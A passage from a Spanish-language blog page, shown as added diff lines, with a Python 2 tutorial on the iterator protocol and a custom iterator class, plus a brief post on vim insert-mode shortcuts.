+<p>¿Que hace que un objeto pueda iterar? Lo hace gracias a un “protocolo”. Cuando se itera, en este caso en el bucle ‘for’, se llama a un método denominado ‘__iter__’, este método que pertenece al objeto lista (y a cualquier otro que lo implemente) va a devolver un objeto “iterator” y sobre el es sobre el que vamos a iterar:</p>
+<p>[sourcecode]<br>
+&gt;&gt;&gt; dir([])<br>
+['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']<br>
+&gt;&gt;&gt; [1,2,3].__iter__()<br>
+&lt;listiterator object at 0xb74b69cc&gt;<br>
+&gt;&gt;&gt; a = [1,2,3].__iter__()<br>
+&gt;&gt;&gt; type(a)<br>
+&lt;type ‘listiterator’&gt;<br>
+[/sourcecode]</p>
+<p>Vemos como el objeto lista tiene el método ‘__iter__’ y que al ser llamado devuelve un objeto iterador. Este objeto lo asignamos a ‘a’.</p>
+<p>Ahora vemos que el objeto iterador implementa un método llamado ‘next’. Este método proporciona un objeto de la lista cada vez que es llamado o mejor dicho, cada vez que se produce una “iteración”. Al no haber más números en la lista, ‘next’, hace saltar la excepción “StopIteration”. La instrucción ‘for’ no propaga la excepción, simplemente la usa para salir de la iteración o bucle.</p>
+<p>[sourcecode]<br>
+&gt;&gt;&gt; dir(a)<br>
+['__class__', '__delattr__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__length_hint__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'next']<br>
+&gt;&gt;&gt; a.next()<br>
+1<br>
+&gt;&gt;&gt; a.next()<br>
+2<br>
+&gt;&gt;&gt; a.next()<br>
+3<br>
+&gt;&gt;&gt; a.next()<br>
+Traceback (most recent call last):<br>
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;<br>
+StopIteration<br>
+&gt;&gt;&gt;<br>
+[/sourcecode]</p>
+<p>¿Podríamos construir nosotros nuestro propio iterador?</p>
+<p>Como no:</p>
+<p>[sourcecode language="python"]<br>
+class MyIter(object):<br>
+    def __init__(self, n):<br>
+        self.lista = range(1, n+1)<br>
+        self.index = -1<br>
+        self.limit = n<br>
+    def __iter__(self):<br>
+        return self<br>
+    def next(self):<br>
+        self.index += 1<br>
+        if self.index == self.limit:<br>
+            raise StopIteration<br>
+        else:<br>
+            return self.lista[self.index]<br>
+[/sourcecode]</p>
+<p>Implementamos ‘__iter__’ que va a devolver al mismo objeto que implementa ‘next’ un metodo que será llamado hasta que devuelva todos los valores que contiene. En ese momento hace saltar la excepción ‘StopIteration’ para que el consumidor sepa que ya no hay más valores disponibles.</p>
+<p>[sourcecode]<br>
+&gt;&gt;&gt; m = myiter.MyIter(8)<br>
+&gt;&gt;&gt; for n in m: print n<br>
+…<br>
+1<br>
+2<br>
+3<br>
+4<br>
+5<br>
+6<br>
+7<br>
+8<br>
+&gt;&gt;&gt;<br>
+[/sourcecode]</p>
+<p>Relacionado con esto se puede ver el módulo ‘itertools’ y el tema de generadores.</p>
+
+    </div>
+    </article><article class="h-entry post-text"><header><h1 class="p-name entry-title"><a href="posts/2011/04/05/vim-algunos-accesos-rapidos/" class="u-url">vim: Algunos accesos rápidos</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn">
+                David García
+            </span></p>
+            <p class="dateline"><a href="posts/2011/04/05/vim-algunos-accesos-rapidos/" rel="bookmark"><time class="published dt-published" datetime="2011-04-05T13:08:26+02:00" title="2011-04-05 13:08">2011-04-05 13:08</time></a></p>
+        </div>
+    </header><div class="e-content entry-content">
+    <p>Cuando estamos en inserción:</p>
+<p>ctrl + o</p>
+<p>Salimos de inserción, podemos hacer un comando del modo normal y volvemos a inserción.</p>
+<p>ctrl + l</p>
+<p>Lo mismo que el anterior pero podemos insertar todos los comandos que queramos y al pulsar escape volvemos al modo inserción.</p>
+<p>en modo normal: </p>
+<p>gi</p>
+<p>Nos lleva al modo inserción justo donde insertamos la última vez.</p>
+
+    </div>
+    </article>
+</div>
+
+        <nav class="postindexpager"><ul class="pager">
+<li class="previous">
+                <a href="index-9.html" rel="prev">Publicaciones posteriores</a>
+            </li>
+            <li class="next">
+                <a href="index-7.html" rel="next">Publicaciones anteriores</a>
+            </li>
+        </ul></nav>
+</div>
+        <!--End of body content-->
+
+        <footer id="footer">
+            Contents © 2016         <a href="mailto:daganu@gmail.com">David García</a> - Powered by         <a href="https://getnikola.com" rel="nofollow">Nikola</a>         
+            
+        </footer>
+</div>
+</div>
+
+
+            <script src="assets/js/all-nocdn.js"></script><script src="assets/js/colorbox-i18n/jquery.colorbox-es.js"></script><script>$('a.image-reference:not(.islink) img:not(.islink)').parent().colorbox({rel:"gal",maxWidth:"100%",maxHeight:"100%",scalePhotos:true});</script><!-- fancy dates --><script>
+    moment.locale("es");
+    fancydates(0, "YYYY-MM-DD HH:mm");
+    </script><!-- end fancy dates -->
+</body>
+</html>
